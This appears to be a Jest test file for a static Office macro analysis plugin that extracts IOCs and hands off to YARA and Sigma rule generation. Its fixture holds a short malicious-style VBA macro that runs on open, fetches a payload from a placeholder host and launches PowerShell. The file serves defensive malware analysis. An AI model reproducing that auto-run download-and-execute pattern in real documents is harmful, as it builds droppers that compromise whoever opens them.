import { describe, expect, test } from '@jest/globals'
import { createPluginTestHarness } from '../../src/plugins/sdk.js'
import officeAnalysisPlugin from '../../src/plugins/office-analysis/index.js'
import { buildOfficeBehaviorProfile } from '../../src/plugins/office-analysis/tools/office-behavior-profile.js'

describe('office.behavior.profile', () => {
  test('builds passive macro behavior, IOC, and rule-generation handoffs', () => {
    const profile = buildOfficeBehaviorProfile({
      sample_id: 'sha256:doc',
      macro_detection: { flags: { auto_exec: true, suspicious: true, ioc: true } },
      ole_analysis: { streams: ['VBA/dir', 'Macros'] },
      vba_sources: `
        Sub Auto_Open()
          Set x = CreateObject("MSXML2.XMLHTTP")
          x.Open "GET", "https://example.test/payload", False
          Shell "powershell -nop"
          StrReverse("abc")
        End Sub
      `,
      strings: ['198.51.100.7', 'FileSystemObject'],
    })

    expect(profile.result_mode).toBe('office_behavior_profile')
    expect(profile.passive_findings.macro_triggers).toEqual(expect.arrayContaining(['Auto_Open']))
    expect(profile.passive_findings.suspicious_api_hints.network).toEqual(
      expect.arrayContaining(['MSXML2.XMLHTTP'])
    )
    expect(profile.passive_findings.suspicious_api_hints.process).toEqual(
      expect.arrayContaining(['CreateObject', 'powershell'])
    )
    expect(profile.ioc_candidates).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ type: 'url', value: 'https://example.test/payload' }),
        expect.objectContaining({ type: 'ip', value: '198.51.100.7' }),
      ])
    )
    expect(profile.rule_generation_handoff.yara.tool).toBe('yara.generate')
    expect(profile.rule_generation_handoff.sigma.tool).toBe('sigma.rule.generate')
    expect(profile.risk_summary.macro_execution_required).toBe(false)
    expect(profile.safety_notes.join(' ')).toMatch(/No Microsoft Office automation/)
  })

  test('registers Office behavior workflow metadata', () => {
    const harness = createPluginTestHarness({
      deps: { workspaceManager: {}, database: {} },
    })
    const names = harness.registerPlugin(officeAnalysisPlugin)
    const tool = harness.registeredTools.find(
      (candidate) => candidate.definition.name === 'office.behavior.profile'
    )

    expect(names).toContain('office.behavior.profile')
    expect(tool?.definition.workflowRecipes?.[0]).toEqual(
      expect.objectContaining({
        id: 'office.macro.static-profile',
        nextTools: expect.arrayContaining(['ioc.export', 'yara.generate']),
      })
    )
    expect(tool?.definition.artifacts?.map((artifact) => artifact.type)).toContain(
      'office_behavior_profile'
    )
  })
})
